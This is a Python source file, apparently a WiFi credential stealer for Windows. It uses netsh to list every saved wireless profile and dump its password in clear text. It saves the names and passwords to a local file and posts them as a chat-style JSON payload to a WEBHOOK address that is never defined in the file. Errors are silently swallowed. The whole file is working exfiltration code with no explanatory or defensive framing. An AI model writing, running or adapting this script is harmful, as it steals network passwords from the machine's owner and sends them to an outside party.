import subprocess
import time
import requests


profilesOutput = ""

try:
    profilesOutput = subprocess.check_output(
        "netsh wlan show profiles",
        shell=True,
        text=True,
        encoding="utf-8",
        errors="ignore",
    )
except:
    pass

wifiProfileNames = []
wifiCredentials = []

for line in profilesOutput.splitlines():
    if "All User Profile" in line:
        profileName = line.split(":", 1)[1].strip()
        wifiProfileNames.append(profileName)

for profileName in wifiProfileNames:
    try:
        profileCommand = f'netsh wlan show profile name="{profileName}" key=clear'
        profileDetails = subprocess.check_output(
            profileCommand, shell=True, text=True, encoding="utf-8", errors="ignore"
        )

        wifiPassword = "Not Available"

        for line in profileDetails.splitlines():
            if "Key Content" in line:
                wifiPassword = line.split(":", 1)[1].strip()

        credentialBlock = (
            f"WiFi Name : {profileName}\n" f"Password  : {wifiPassword}\n" f"\n"
        )

        wifiCredentials.append(credentialBlock)

    except:
        continue

timeStamp = time.strftime("%d-%m_%H-%M")
outputFileName = f"WiFi-Passwords-{timeStamp}.txt"

try:
    with open(outputFileName, "w", encoding="utf-8") as outputFile:
        for credential in wifiCredentials:
            outputFile.write(credential)
except:
    pass

payload = f"```{"\n".join(wifiCredentials)}```"
try:
    requests.post(WEBHOOK, json={"content": payload})
except:
    pass
